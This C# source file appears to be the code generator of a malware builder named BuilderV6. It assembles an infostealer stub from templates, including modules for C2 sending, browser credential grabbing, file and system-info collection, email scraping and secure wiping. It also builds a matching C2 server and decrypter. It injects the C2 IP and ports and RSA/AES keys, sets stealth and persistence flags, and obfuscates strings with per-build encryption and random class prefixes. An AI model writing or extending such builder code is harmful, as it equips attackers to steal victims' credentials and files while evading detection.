using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using BuilderV6.Polymorphism;

namespace BuilderV6
{
    public class CodeGenerator
    {
        readonly BuildConfig _cfg;
        readonly string _classPrefix;
        readonly byte[] _stringKey;
        readonly byte[] _stringIv;
        readonly Dictionary<string, string> _templates;
        readonly byte[] _rsaPubBlob;
        readonly byte[] _rsaPrivXml;

        public CodeGenerator(BuildConfig cfg, byte[] pubBlob, byte[] privXml)
        {
            _cfg = cfg;
            _rsaPubBlob = pubBlob;
            _rsaPrivXml = privXml;
            _templates = TemplateLoader.LoadTemplates(cfg.TemplateDir);
            _classPrefix = GeneratePrefix();
            var sk = StringEncryptor.GenerateKey();
            _stringKey = sk.Key;
            _stringIv = sk.IV;
        }

        public GeneratedSource GenerateStub()
        {
            var files = new Dictionary<string, string>();
            var macroValues = BuildMacroValues();

            string[] coreFiles = {
                "Stub/Program", "Stub/Core/Engine", "Stub/Core/Config"
            };
            var include = new List<string>(coreFiles);
            include.Add("Shared/SecureWipe");
            include.Add("Stub/C2/C2Sender");
            include.Add("Stub/C2/Dispatch");
            include.Add("Stub/Crypto/LogProtector");
            include.Add("Stub/Grabbers/Files");
            include.Add("Stub/Grabbers/SystemInfo");
            include.Add("Stub/Grabbers/Browsers");
            include.Add("Stub/Grabbers/EmailScraper");

            foreach (var key in include)
            {
                if (!_templates.ContainsKey(key))
                {
                    Console.WriteLine($"  [WARN] Template not found: {key}");
                    continue;
                }
                string src = ProcessTemplate(_templates[key], macroValues);
                string fileName = key.Replace("Stub/", "").Replace("/", ".") + ".cs";
                files[fileName] = src;
                Console.WriteLine($"  [GEN] {fileName}");
            }

            files["Strings.cs"] = StringEncryptor.GenerateDecryptionClass(_classPrefix, _stringKey, _stringIv);
            return new GeneratedSource { Files = files, ClassPrefix = _classPrefix };
        }

        public GeneratedSource GenerateServer()
        {
            var files = new Dictionary<string, string>();
            var macroValues = BuildMacroValues();
            string[] serverFiles = { "Server/Program", "Server/Crypto/ServerDecrypt" };
            foreach (var key in serverFiles)
            {
                if (!_templates.ContainsKey(key)) continue;
                string src = ProcessTemplate(_templates[key], macroValues);
                files[key.Replace("Server/", "").Replace("/", ".") + ".cs"] = src;
            }
            files["Strings.cs"] = StringEncryptor.GenerateDecryptionClass(_classPrefix, _stringKey, _stringIv);
            return new GeneratedSource { Files = files, ClassPrefix = _classPrefix };
        }

        public GeneratedSource GenerateDecrypter()
        {
            var files = new Dictionary<string, string>();
            var macroValues = BuildMacroValues();
            string[] decFiles = { "Decrypter/Program", "Decrypter/Crypto/DecryptEngine" };
            foreach (var key in decFiles)
            {
                if (!_templates.ContainsKey(key)) continue;
                string src = ProcessTemplate(_templates[key], macroValues);
                files[key.Replace("Decrypter/", "").Replace("/", ".") + ".cs"] = src;
            }
            files["Strings.cs"] = StringEncryptor.GenerateDecryptionClass(_classPrefix, _stringKey, _stringIv);
            return new GeneratedSource { Files = files, ClassPrefix = _classPrefix };
        }

        public string ProcessTemplate(string template, Dictionary<string, string> macros)
        {
            string src = template;
            foreach (var kv in macros.OrderByDescending(k => k.Key.Length))
                src = src.Replace("{{" + kv.Key + "}}", kv.Value);

            src = StringEncryptor.Transform(src, _stringKey, _stringIv, _classPrefix);

            return src;
        }

        public Dictionary<string, string> BuildMacroValues()
        {
            var d = new Dictionary<string, string>();
            d["BUILD_ID"] = _cfg.BuildId;
            d["C2_IP"] = _cfg.ServerIp;
            d["C2_PORTS"] = string.Join(",", _cfg.ServerPorts);
            d["TIER"] = _cfg.Tier.ToString();
            d["CLASS_PREFIX"] = _classPrefix;
            d["FLAGS"] = EncodeFlags();
            d["RSA_PUB_BLOB_B64"] = Convert.ToBase64String(_rsaPubBlob);
            d["RSA_PRIV_XML_B64"] = Convert.ToBase64String(_rsaPrivXml);
            d["AES_KEY_B64"] = Convert.ToBase64String(_stringKey);
            return d;
        }

        string EncodeFlags()
        {
            byte f = 0;
            if (_cfg.Stealth) f |= 1;
            if (_cfg.Persist) f |= 2;
            return f.ToString();
        }

        public string GeneratePrefix()
        {
            var rng = RandomNumberGenerator.Create();
            var sb = new System.Text.StringBuilder();
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            byte[] b = new byte[1];
            for (int i = 0; i < 3; i++)
            {
                rng.GetBytes(b);
                sb.Append(chars[b[0] % chars.Length]);
            }
            return sb.ToString();
        }
    }

    public class GeneratedSource
    {
        public Dictionary<string, string> Files { get; set; } = new();
        public string ClassPrefix { get; set; } = "";
    }
}
